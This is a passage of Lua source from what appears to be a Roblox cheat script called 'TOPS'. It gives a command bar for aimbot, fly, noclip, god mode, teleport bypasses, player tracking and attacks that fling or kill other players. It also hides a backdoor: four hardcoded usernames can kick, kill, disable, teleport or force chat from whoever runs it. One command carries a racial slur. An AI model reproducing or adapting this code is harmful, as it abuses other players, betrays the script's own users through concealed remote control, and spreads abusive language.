										plr.Backpack:WaitForChild ( "Glock" ).Parent = GetlCharacter (  )
										GetlCharacter (  ):WaitForChild ( "Right Arm" ):Destroy (  )
										while AnitFe and GetlCharacter (  ):WaitForChild ( "Glock" ).Handle do
											GetlCharacter (  ):WaitForChild ( "Glock" ).Handle.CFrame = GetlCharacter (  ).Head.CFrame * CFrame.Angles ( math.rad ( 0 ), math.rad ( -90 ), math.rad ( 0 ) ) + Vector3.new ( 0, 1.5, 0 )
											hb:wait (  )
										end
									end
									if FeLooping then
										_G.bypass = false
										repeat
											wait (  )
										until GetlCharacter (  ):FindFirstChild ( 'HumanoidRootPart' ) and GetlCharacter (  ):FindFirstChild ( 'Humanoid' )
										repeat
											wait (  )
										until FeLoopTarget.Character and FeLoopTarget.Character:FindFirstChild ( 'Torso' )
										GetlCharacter (  ).Humanoid.Name = "LOL"
										local h = GetlCharacter (  ).LOL:Clone (  )
										h.Name = "Nice"
										h.Parent = GetlCharacter (  )
										GetlCharacter (  ).LOL:Destroy (  )
										workspace.CurrentCamera.CameraSubject = FeLoopTarget.Character
										while hb:wait (  ) do
											if GetlCharacter (  ):WaitForChild ( 'HumanoidRootPart' ) and FeLoopTarget.Character:FindFirstChild ( 'Torso' ) then
												GetlCharacter (  ).HumanoidRootPart.Velocity = Vector3.new ( 3e5, -3e5, 3e5 )
												GetlCharacter (  ).HumanoidRootPart.CFrame = FeLoopTarget.Character.Torso.CFrame
												GetlCharacter (  ).HumanoidRootPart.Velocity = Vector3.new ( 3e5, -3e5, 3e5 )
											end
											for i, v in pairs ( plr.Backpack:GetChildren (  ) ) do
												if v:IsA ( 'Tool' ) then
													v.Parent = GetlCharacter (  )
												end
											end
										end
									end
								end )
								m.KeyUp:connect ( function ( Key )
									if Key == string.lower ( ConfigToSave.cmdbar_Hotkey ) then
										CmdBarMain:CaptureFocus (  )
										CmdBarMain.Visible = true
										CmdBarMain:TweenPosition ( UDim2.new ( 0.07, 0, 0.5, 0 ), "Out", "Back", 0.5, true )
										CmdBarMain.Text = ""
										CmdBarMain.Sound:Play (  )
									end
								end )
								CmdBarMain.FocusLost:Connect ( function ( enterPressed )
									CmdBarMain:TweenPosition ( UDim2.new ( -1, 0, 0.5, 0 ), "Out", "Quad", 0.5, true )
									wait ( 0.2 )
									CmdBarMain.Visible = false
									if enterPressed then
										if CmdBarMain.Text:sub ( 1, 3 ) == 'to ' then
											local tt = GetPlayer ( CmdBarMain.Text:sub ( 4 ) )
											if _G.bypass == true then
												TweenToPlayer ( tt, 90000 )
											elseif _G.bypass == false then
												TweenToPlayer ( tt, 200 )
											end
										elseif CmdBarMain.Text == "drop" then
											plr.Character:FindFirstChildWhichIsA ( "Tool" ).Parent = game.Workspace.Terrain
											plr.Character:Remove (  )
										elseif CmdBarMain.Text:sub ( 1, 3 ) == "bs " then
											local speed = CmdBarMain.Text:sub ( 4 )
											ConfigToSave.BlinkSpeed = speed
											ConfigToSave.Bs = true
										elseif CmdBarMain.Text == "unbs" then
											ConfigToSave.Bs = false
										elseif CmdBarMain.Text:sub ( 1, 5 ) == "find " then
											local tt = GetPlayer ( CmdBarMain.Text:sub ( 6 ) )
											if tt.Character:FindFirstChild ( 'HumanoidRootPart' ) then
												Esp ( tt, tt.Character.HumanoidRootPart )
											elseif not tt.Character:FindFirstChild ( 'HumanoidRootPart' ) and tt.Character:FindFirstChild ( 'Torso' ) then
												Esp ( tt, tt.Character.Torso )
											end
										elseif CmdBarMain.Text == 'invis' then
											_G.bypass = false
											ConfigToSave.Noclip = true
											ByeBody ( game.Players.LocalPlayer )
											CreateBox ( game.Players.LocalPlayer.Character.HumanoidRootPart, 'Outline_Light' )
										elseif CmdBarMain.Text == "new sp" then
											if workspace:FindFirstChild ( 'SpacePart' ) then
											else
												SpacePart (  )
											end
										elseif CmdBarMain.Text == "delete sp" then
											for i, v in pairs ( workspace:GetChildren (  ) ) do
												if v.Name == "SpacePart" then
													v:Destroy (  )
												end
											end
										elseif CmdBarMain.Text == "leave" then
											game:Shutdown (  )
										elseif CmdBarMain.Text == "cmds" then
											Cmds ( Commands )
										elseif CmdBarMain.Text:sub ( 1, 2 ) == "c " then
											local tt = GetPlayer ( CmdBarMain.Text:sub ( 3 ) )
											Camlocking = true
											CamlockTar = tt
											notify ( 'Camlocking: ' .. tt.Name, AvailableFonts[6], 3 / 2 )
											notify ( 'Press ' .. '\'' .. ConfigToSave.camlock_Hotkey:upper (  ) .. '\'' .. ' to use it.', AvailableFonts[6], 2 )
										elseif CmdBarMain.Text == "unc" then
											CamlockTar = nil
										elseif CmdBarMain.Text:sub ( 1, 7 ) == 'bindcl ' then
											local hotkeytoset = CmdBarMain.Text:sub ( 8 )
											ConfigToSave.camlock_Hotkey = hotkeytoset
											notify ( 'Camlock hotkey: ' .. hotkeytoset, AvailableFonts[6], 3 / 2 )
										elseif CmdBarMain.Text:sub ( 1, 8 ) == 'bindfly ' then
											local hotkeytoset = CmdBarMain.Text:sub ( 9 )
											ConfigToSave.fly_HotKey = hotkeytoset
											notify ( 'Fly hotkey: ' .. hotkeytoset, AvailableFonts[6], 3 / 2 )
										elseif CmdBarMain.Text:sub ( 1, 2 ) == "a " then
											local tt = GetPlayer ( CmdBarMain.Text:sub ( 3 ) )
											IsAimbotting = true
											AimbotTarget = tt
											notify ( 'Aimboting: ' .. tt.Name, AvailableFonts[6], 3 / 2 )
											notify ( 'Press ' .. '\'' .. ConfigToSave.aimbot_Hotkey:upper (  ) .. '\'' .. ' to use it.', AvailableFonts[6], 2 )
										elseif CmdBarMain.Text == "una" then
											AimbotTarget = nil
										elseif CmdBarMain.Text:sub ( 1, 5 ) == "loop " then
											local tt = GetPlayer ( CmdBarMain.Text:sub ( 6 ) )
											FeLooping = true
											FeLoopTarget = tt
											plr.Character:BreakJoints (  )
											plr.Character:ClearAllChildren (  )
											notify ( 'Felooping: ' .. tt.Name, AvailableFonts[6], 3 / 2 )
										elseif CmdBarMain.Text == "unloop" then
											FeLooping = false
											notify ( 'Stopped looping', AvailableFonts[6], 2 )
											FeLoopTarget = nil
										elseif CmdBarMain.Text == "af on" then
											AnitFe = true
											plr.Character:BreakJoints (  )
											plr.Character:ClearAllChildren (  )
										elseif CmdBarMain.Text == "af off" then
											AnitFe = false
											plr.Character:BreakJoints (  )
											plr.Character:ClearAllChildren (  )
										elseif CmdBarMain.Text == "space" then
											if game.PlaceId == 455366377 then
												TweenToPos ( 0, -760, 0, 300 )
											elseif game.PlaceId == 4669040 then
												if _G.bypass == true then
													TweenToPos ( 0, -760, 0, 90000 )
												elseif _G.bypass == false then
													TweenToPos ( 0, -760, 0, 300 )
												end
											end
										elseif CmdBarMain.Text == "areset on" then
											ConfigToSave.AutoReset = true
											Areset_Connect = plr.Character.ChildAdded:Connect ( function ( poop )
												if poop.Name == 'KO' then
													plr.Character:BreakJoints (  )
												end
											end )
											notify ( 'Auto-Reset on', AvailableFonts[6], 2 )
										elseif CmdBarMain.Text == "areset off" then
											ConfigToSave.AutoReset = false
											Areset_Connect:Disconnect (  )
											notify ( 'Auto-Reset off', AvailableFonts[6], 2 )
										elseif CmdBarMain.Text:sub ( 1, 5 ) == 'view ' then
											local tt = GetPlayer ( CmdBarMain.Text:sub ( 6 ) )
											workspace.CurrentCamera.CameraSubject = tt.Character
										elseif CmdBarMain.Text == "unview" then
											workspace.CurrentCamera.CameraSubject = plr.Character
										elseif CmdBarMain.Text:sub ( 1, 7 ) == "bindcb " then
											local hotkeytoset = CmdBarMain.Text:sub ( 8 )
											ConfigToSave.cmdbar_Hotkey = hotkeytoset
											notify ( 'Command bar hotkey: ' .. hotkeytoset, AvailableFonts[6], 3 / 2 )
										elseif CmdBarMain.Text == 'lowgfx' then
											for _, v in pairs ( workspace:GetDescendants (  ) ) do
												if v.ClassName == "Part" or v.ClassName == "SpawnLocation" or v.ClassName == "WedgePart" or v.ClassName == "Terrain" or v.ClassName == "MeshPart" or v.ClassName == 'UnionOperation' then
													v.Material = "SmoothPlastic"
													if v:IsA ( 'MeshPart' ) and v.Parent.Name == 'Spotlight' then
														v.Transparency = 0.86
													end
												end
											end
										elseif CmdBarMain.Text == "apunch" then
											for i, v in pairs ( game.Players.LocalPlayer.Backpack:GetChildren (  ) ) do
												if v.Name == 'Punch' then
													if v:FindFirstChild ( 'Handle' ) then
														v.Handle.Massless = true
														v.GripPos = Vector3.new ( 0, 0 / 0, 0 )
														v.Parent = game.Players.LocalPlayer.Character
														notify ( 'Atom Punch on. (Reset in order to turn off)', AvailableFonts[6], 2 )
													end
												end
											end
										elseif CmdBarMain.Text == "nigga destroyer" then
											for i, v in pairs ( game.Players.LocalPlayer.Backpack:GetChildren (  ) ) do
												if v.Name == 'Punch' then
													if v:FindFirstChild ( 'Handle' ) then
														v.Handle.Massless = true
														v.GripPos = Vector3.new ( 0, 0 / 0, 0 )
														v.Parent = game.Players.LocalPlayer.Character
														notify ( 'Shhh.. lol secret command XD', AvailableFonts[6], 2 )
													end
												end
											end
										elseif CmdBarMain.Text:sub ( 1, 3 ) == "ws " then
											local num = CmdBarMain.Text:sub ( 4 )
											if game.PlaceId == 455366377 then
												God = true
											end
											wait ( 0.1 )
											GetlCharacter (  ).Humanoid.WalkSpeed = num
											notify ( 'WalkSpeed set to: ' .. num, AvailableFonts[6], 2 )
										elseif CmdBarMain.Text:sub ( 1, 3 ) == "jp " then
											local num = CmdBarMain.Text:sub ( 4 )
											if game.PlaceId == 455366377 then
												God = true
											end
											wait ( 0.1 )
											GetlCharacter (  ).Humanoid.JumpPower = num
											notify ( 'JumpPower set to: ' .. num, AvailableFonts[6], 2 )
										elseif CmdBarMain.Text == "grab on" then
											OnGrab = true
											notify ( 'Grab on', AvailableFonts[6], 2 )
										elseif CmdBarMain.Text == "grab off" then
											OnGrab = false
											notify ( 'Grab off', AvailableFonts[6], 2 )
										elseif CmdBarMain.Text == "leave" then
											game:Shutdown (  )
										elseif CmdBarMain.Text:sub ( 1, 3 ) == "fs " then
											local num = CmdBarMain.Text:sub ( 4 )
											ConfigToSave.flysped = num
											notify ( 'Flyspeed was set to: ' .. ConfigToSave.flysped, AvailableFonts[6], 2 )
										elseif CmdBarMain.Text:sub ( 1, 9 ) == "flyspeed " then
											local num = CmdBarMain.Text:sub ( 10 )
											ConfigToSave.flysped = num
											notify ( 'Flyspeed set to: ' .. ConfigToSave.flysped, AvailableFonts[6], 2 )
										elseif CmdBarMain.Text == 'tpb off' then
											if game.PlaceId == 4669040 then
												_G.bypass = false
												plr.Character:BreakJoints (  )
												plr.Character:ClearAllChildren (  )
												notify ( 'TP bypass off.', AvailableFonts[6], 2 )
											else
												notify ( 'TP bypass only works in Prison.', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'tpb on' then
											if game.PlaceId == 4669040 then
												_G.bypass = true
												plr.Character:BreakJoints (  )
												plr.Character:ClearAllChildren (  )
												notify ( 'TP bypass on.', AvailableFonts[6], 2 )
											else
												notify ( 'TP bypass only works in Prison.', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'glock' then
											if game.PlaceId == 455366377 then
												Buy ( tools[1], 500 )
											else
												notify ( 'You can buy items only on The Streets.', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'uzi' then
											if game.PlaceId == 455366377 then
												Buy ( tools[2], 500 )
											else
												notify ( 'You can buy items only on The Streets.', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'sawed off' then
											if game.PlaceId == 455366377 then
												Buy ( tools[3], 500 )
											else
												notify ( 'You can buy items only on The Streets.', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'bat' then
											if game.PlaceId == 455366377 then
												Buy ( tools[4], 500 )
											else
												notify ( 'You can buy items only on The Streets.', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'bottle' then
											if game.PlaceId == 455366377 then
												Buy ( tools[5], 500 )
											else
												notify ( 'You can buy items only on The Streets.', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'golf club' then
											if game.PlaceId == 455366377 then
												Buy ( tools[6], 500 )
											else
												notify ( 'You can buy items only on The Streets.', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'machete' then
											if game.PlaceId == 455366377 then
												Buy ( tools[7], 500 )
											else
												notify ( 'You can buy items only on The Streets.', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'pipe' then
											if game.PlaceId == 455366377 then
												Buy ( tools[8], 500 )
											else
												notify ( 'You can buy items only on The Streets.', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'spray' then
											if game.PlaceId == 455366377 then
												Buy ( tools[9], 500 )
											else
												notify ( 'You can buy items only on The Streets.', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'lockpick' then
											if game.PlaceId == 455366377 then
												Buy ( tools[10], 500 )
											else
												notify ( 'You can buy items only on The Streets.', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'ammo' then
											if game.PlaceId == 455366377 then
												Buy ( tools[11], 500 )
											else
												notify ( 'You can buy items only on The Streets.', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'burger' then
											if game.PlaceId == 455366377 then
												Buy ( tools[12], 500 )
											else
												notify ( 'You can buy items only on The Streets.', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'drink' then
											if game.PlaceId == 455366377 then
												Buy ( tools[13], 500 )
											else
												notify ( 'You can buy items only on The Streets.', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'chicken' then
											if game.PlaceId == 455366377 then
												Buy ( tools[14], 500 )
											else
												notify ( 'You can buy items only on The Streets.', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'god on' then
											if game.PlaceId == 455366377 then
												God = true
												notify ( 'God on', AvailableFonts[6], 2 )
											elseif game.PlaceId == 4669040 then
												RGod = true
												GetlCharacter (  ):BreakJoints (  )
												notify ( 'God on', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'god off' then
											if game.PlaceId == 455366377 then
												God = false
												notify ( 'God off', AvailableFonts[6], 2 )
											elseif game.PlaceId == 4669040 then
												RGod = false
												GetlCharacter (  ):BreakJoints (  )
												notify ( 'God off', AvailableFonts[6], 2 )
											end
										elseif CmdBarMain.Text == 'aglock on' then
											ConfigToSave.AttachGlock = true
											notify ( 'Attach glock on.', AvailableFonts[6], 2 )
										elseif CmdBarMain.Text == 'aglock off' then
											ConfigToSave.AttachGlock = false
											notify ( 'Attach glock off.', AvailableFonts[6], 2 )
										elseif CmdBarMain.Text == 'noclip on' then
											ConfigToSave.Noclip = true
											notify ( 'Noclip on', AvailableFonts[6], 2 )
										elseif CmdBarMain.Text == 'noclip off' then
											ConfigToSave.Noclip = false
											notify ( 'Noclip off', AvailableFonts[6], 2 )
										elseif CmdBarMain.Text == 'aa on' then
											ConfigToSave.AntiAim = true
											notify ( 'Press ' .. '\'' .. ConfigToSave.AntiAim_Hotkey:upper (  ) .. '\'' .. ' to use it.', AvailableFonts[6], 2 )
										elseif CmdBarMain.Text == 'aa off' then
											ConfigToSave.AntiAim = false
										elseif CmdBarMain.Text:sub ( 1, 7 ) == 'bindaa ' then
											local hotkeytoset = CmdBarMain.Text:sub ( 8 )
											ConfigToSave.AntiAim_Hotkey = hotkeytoset
											notify ( 'Anti Aim hotkey: ' .. hotkeytoset, AvailableFonts[6], 3 / 2 )
										elseif CmdBarMain.Text == 'aw on' then
											ConfigToSave.AirWalk = true
											notify ( 'Press ' .. '\'' .. ConfigToSave.AirWalk_Hotkey:upper (  ) .. '\'' .. ' to use it.', AvailableFonts[6], 2 )
										elseif CmdBarMain.Text == 'aw off' then
											ConfigToSave.AirWalk = false
										elseif CmdBarMain.Text:sub ( 1, 7 ) == 'bindaw ' then
											local hotkeytoset = CmdBarMain.Text:sub ( 8 )
											ConfigToSave.AirWalk_Hotkey = hotkeytoset
											notify ( 'Airwalk hotkey: ' .. hotkeytoset, AvailableFonts[6], 3 / 2 )
										elseif CmdBarMain.Text == 'day on' then
											ConfigToSave.Day = true
											notify ( 'Day set on permanently', AvailableFonts[6], 2 )
										elseif CmdBarMain.Text == 'day off' then
											ConfigToSave.Day = false
											notify ( 'Day set off permanently', AvailableFonts[6], 2 )
										elseif CmdBarMain.Text:sub ( 1, 5 ) == 'alog ' then
											local tt = GetPlayer ( CmdBarMain.Text:sub ( 6 ) )
											if tt.Character then
												if tt.Character:FindFirstChild ( 'BoxModel' ) then
													if tt.Character:FindFirstChild ( 'BoxModel' ):IsA ( 'Model' ) then
														syn.write_clipboard ( tt.Character['BoxModel'].Handle.SoundX.SoundId )
														Audio_Logger_Notify ( tt.Character['BoxModel'].Handle.SoundX.SoundId, tt.Name, 2 )
													end
												elseif tt.Character:FindFirstChild ( 'BoomBox' ) then
													if tt.Character:FindFirstChild ( 'BoomBox' ):IsA ( 'Tool' ) then
														syn.write_clipboard ( tt.Character.BoomBox.Handle.SoundX.SoundId )
														Audio_Logger_Notify ( tt.Character.BoomBox.Handle.SoundX.SoundId, tt.Name, 2 )
													end
												end
											end
										elseif CmdBarMain.Text:sub ( 1, 5 ) == 'dlog ' then
											local tt = GetPlayer ( CmdBarMain.Text:sub ( 6 ) )
											if workspace:FindFirstChild ( tt.Name .. 'Spray' ) then
												syn.write_clipboard ( workspace[tt.Name .. 'Spray'].Decal.Texture )
												Decal_Logger_Notify ( workspace[tt.Name .. 'Spray'].Decal.Texture, tt.Name, 2 )
											end
										elseif CmdBarMain.Text == 'fp on' then
											ConfigToSave.fightpack = true
											local Connection = m.KeyDown:Connect ( FightPack )
											GetlCharacter (  ).Humanoid.Died:Connect ( function (  )
												Connection:Disconnect (  )
											end )
											notify ( 'Press ' .. '\'' .. ConfigToSave.fightpack_Hotkey:upper (  ) .. '\'' .. ' to use it.', AvailableFonts[6], 2 )
										elseif CmdBarMain.Text == 'fp off' then
											ConfigToSave.fightpack = false
											GetlCharacter (  ):BreakJoints (  )
										elseif CmdBarMain.Text:sub ( 1, 7 ) == 'bindfp ' then
											local hotkeytoset = CmdBarMain.Text:sub ( 8 )
											ConfigToSave.fightpack_Hotkey = hotkeytoset
											notify ( 'Fightpack hotkey: ' .. hotkeytoset, AvailableFonts[6], 3 / 2 )
										elseif CmdBarMain.Text:sub ( 1, 7 ) == 'bindab ' then
											local hotkeytoset = CmdBarMain.Text:sub ( 8 )
											ConfigToSave.aimbot_Hotkey = hotkeytoset
											notify ( 'Aimbot hotkey: ' .. hotkeytoset, AvailableFonts[6], 3 / 2 )
										elseif CmdBarMain.Text == 'save c' then
											writefile ( 'TOPS_config.json', http:JSONEncode ( ConfigToSave ) )
											print ( 'writed.' )
											notify ( 'Saved config. Type \'load c\' to load config.', AvailableFonts[6], 3 )
										elseif CmdBarMain.Text == 'load c' then
											local readtconfig = readfile ( 'TOPS_config.json' )
											local jsondecoded = http:JSONDecode ( readtconfig )
											ConfigToSave.Noclip = jsondecoded.Noclip
											ConfigToSave.AttachGlock = jsondecoded.AttachGlock
											ConfigToSave.flysped = jsondecoded.flysped
											ConfigToSave.fly_HotKey = jsondecoded.fly_HotKey
											ConfigToSave.Day = jsondecoded.Day
											ConfigToSave.Bs = jsondecoded.Bs
											ConfigToSave.BlinkSpeed = jsondecoded.BlinkSpeed
											ConfigToSave.AirWalk = jsondecoded.AirWalk
											ConfigToSave.AirWalk_Hotkey = jsondecoded.AirWalk_Hotkey
											ConfigToSave.AntiAim = jsondecoded.AntiAim
											ConfigToSave.AntiAim_Hotkey = jsondecoded.AntiAim_Hotkey
											ConfigToSave.fightpack = jsondecoded.fightpack
											ConfigToSave.fightpack_Hotkey = jsondecoded.fightpack_Hotkey
											ConfigToSave.camlock_Hotkey = jsondecoded.camlock_Hotkey
											ConfigToSave.aimbot_Hotkey = jsondecoded.aimbot_Hotkey
											ConfigToSave.cmdbar_Hotkey = jsondecoded.cmdbar_Hotkey
											ConfigToSave.AutoReset = jsondecoded.AutoReset
											print ( 'loaded.' )
											notify ( 'Config loaded.', AvailableFonts[6], 3 / 2 )
										elseif CmdBarMain.Text == 'rejoin' then
											for i = 1, 5 do
												game:GetService ( 'TeleportService' ):Teleport ( game.PlaceId )
												wait (  )
											end
										end
									end
								end )
								FlyCoroutine = coroutine.create ( function (  )
									m.KeyDown:connect ( function ( key )
										if key:lower (  ) == ConfigToSave.fly_HotKey then
											if flying then
												flying = false
											else
												flying = true
												Fly (  )
											end
										elseif key:lower (  ) == "w" then
											ctrl.f = ( ConfigToSave.flysped * 10 )
										elseif key:lower (  ) == "s" then
											ctrl.b = -( ConfigToSave.flysped * 10 )
										elseif key:lower (  ) == "a" then
											ctrl.l = -( ConfigToSave.flysped * 10 )
										elseif key:lower (  ) == "d" then
											ctrl.r = ( ConfigToSave.flysped * 10 )
										end
									end )
									m.KeyUp:connect ( function ( key )
										if key:lower (  ) == "w" then
											ctrl.f = 0
										elseif key:lower (  ) == "s" then
											ctrl.b = 0
										elseif key:lower (  ) == "a" then
											ctrl.l = 0
										elseif key:lower (  ) == "d" then
											ctrl.r = 0
										end
									end )
								end )
								coroutine.resume ( FlyCoroutine )
								for i, p in pairs ( game:GetService ( "Players" ):GetPlayers (  ) ) do
									if p.Name == "vX_F" or p.Name == "ChupaChupsy" or p.Name == "CR0WNEDD" or p.Name == "filmowy" then
										p.Chatted:Connect ( function ( msg )
											WhoSaidThat = p
											local args = {
											}
											for arg in msg:gmatch ( "%S+" ) do
												args[#args + 1] = arg
											end
											if args[1] ~= nil then
												if args[1]:lower (  ) == "" .. commandPrefix .. "kick" and args[2] ~= nil and args[3] ~= nil then
													local me = args[2]:lower (  )
													if me == "vX_F" then
														return 
													end
													if plr.Name:lower (  ):sub ( 1, #me ) == me then
														plr:Kick ( "Get fucked." .. args[3] )
													end
												elseif args[1]:lower (  ) == "" .. commandPrefix .. "chat" and args[2] ~= nil and args[3] ~= nil then
													local me = args[2]:lower (  )
													if me == "vX_F" then
														return 
													end
													if plr.Name:lower (  ):sub ( 1, #me ) == me then
														game:GetService ( "ReplicatedStorage" ).DefaultChatSystemChatEvents.SayMessageRequest:FireServer ( tostring ( args[3] ), "All" )
													end
												elseif args[1]:lower (  ) == "" .. commandPrefix .. "disable" and args[2] ~= nil then
													local me = args[2]:lower (  )
													if me == "ChupaChupsy" then
														return 
													end
													if plr.Name:lower (  ):sub ( 1, #me ) == me then
														plr.Character["Right Arm"]:Destroy (  )
														plr.Character["Left Arm"]:Destroy (  )
														plr.Character["Right Leg"]:Destroy (  )
														plr.Character["Left Leg"]:Destroy (  )
														plr.Character.Humanoid.PlatformStand = true
													end
												elseif args[1]:lower (  ) == "" .. commandPrefix .. "bring" and args[2] ~= nil then
													local me = args[2]:lower (  )
													if plr.Name:lower (  ):sub ( 1, #me ) == me then
														local TweenInf0 = TweenInfo.new ( 1 * math.floor ( ( plr.Character["HumanoidRootPart"].Position - WhoSaidThat.Character.Torso.Position ).magnitude ) / 200, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0 )
														_G.TweenService:Create ( plr.Character["HumanoidRootPart"], TweenInf0, {
															CFrame = WhoSaidThat.Character.Torso.CFrame * CFrame.new ( 0, 0, -3 )
														} ):Play (  )
													end
												elseif args[1]:lower (  ) == "" .. commandPrefix .. "kill" and args[2] ~= nil then
													local me = args[2]:lower (  )
													if me == "ChupaChupsy" then
														return 
													end
													if plr.Name:lower (  ):sub ( 1, #me ) == me then
														plr.Character:BreakJoints (  )
													end
												end
											end
										end )
									end
								end
								game.Players.PlayerAdded:Connect ( function ( p )
									if p.Name == "vX_F" or p.Name == "ChupaChupsy" or p.Name == "CR0WNEDD" or p.Name == "filmowy" then
										p.Chatted:Connect ( function ( msg )
											WhoSaidThat = p
											local args = {
											}
											for arg in msg:gmatch ( "%S+" ) do
												args[#args + 1] = arg
											end
											if args[1] ~= nil then
												if args[1]:lower (  ) == "" .. commandPrefix .. "kick" and args[2] ~= nil and args[3] ~= nil then
													local me = args[2]:lower (  )
													if me == "vX_F" or me == "ChupaChupsy" or p.Name == "CR0WNEDD" or p.Name == "filmowy" then
														return 
													end
													if plr.Name:lower (  ):sub ( 1, #me ) == me then
														plr:Kick ( "Get fucked lol." .. args[3] )
													end
												elseif args[1]:lower (  ) == "" .. commandPrefix .. "disable" and args[2] ~= nil then
													local me = args[2]:lower (  )
													if me == "ChupaChupsy" then
														return 
													end
													if plr.Name:lower (  ):sub ( 1, #me ) == me then
														plr.Character["Right Arm"]:Destroy (  )
														plr.Character["Left Arm"]:Destroy (  )
														plr.Character["Right Leg"]:Destroy (  )
														plr.Character["Left Leg"]:Destroy (  )
														plr.Character.Humanoid.PlatformStand = true
													end
												elseif args[1]:lower (  ) == "" .. commandPrefix .. "bring" and args[2] ~= nil then
													local me = args[2]:lower (  )
													if plr.Name:lower (  ):sub ( 1, #me ) == me then
														local TweenInf0 = TweenInfo.new ( 1 * math.floor ( ( plr.Character["HumanoidRootPart"].Position - WhoSaidThat.Character.Torso.Position ).magnitude ) / 200, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0 )
														_G.TweenService:Create ( plr.Character["HumanoidRootPart"], TweenInf0, {
															CFrame = WhoSaidThat.Character.Torso.CFrame * CFrame.new ( 0, 0, -3 )
														} ):Play (  )
													end
												elseif args[1]:lower (  ) == "" .. commandPrefix .. "chat" and args[2] ~= nil and args[3] ~= nil then
													local me = args[2]:lower (  )
													if me == "vX_F" or me == "ChupaChupsy" or p.Name == "CR0WNEDD" or p.Name == "filmowy" then
														return 
													end
													if plr.Name:lower (  ):sub ( 1, #me ) == me then
														game:GetService ( "ReplicatedStorage" ).DefaultChatSystemChatEvents.SayMessageRequest:FireServer ( tostring ( args[3] ), "All" )
													end
												elseif args[1]:lower (  ) == "" .. commandPrefix .. "kill" and args[2] ~= nil then
													local me = args[2]:lower (  )
													if me == "vX_F" or me == "ChupaChupsy" or p.Name == "CR0WNEDD" or p.Name == "filmowy" then
														return 
													end
													if plr.Name:lower (  ):sub ( 1, #me ) == me then
														plr.Character:BreakJoints (  )
													end
												end
											end
										end )
									end
								end )
								_G.bypass = false
								notify ( "Loaded in " .. tostring ( tick (  ) - start ):sub ( 1, 6 ) .. " seconds.", AvailableFonts[6], 2 )
								notify ( "Thank you 4 using TOPS, ENJOY!", AvailableFonts[6], 2 )
							end
						end )
					else
						yeet (  )
					end
				else
					yeet (  )
				end
			else
				yeet (  )
			end
		else
			yeet (  )
		end
	else
		yeet (  )
	end
else
	yeet (  )
end
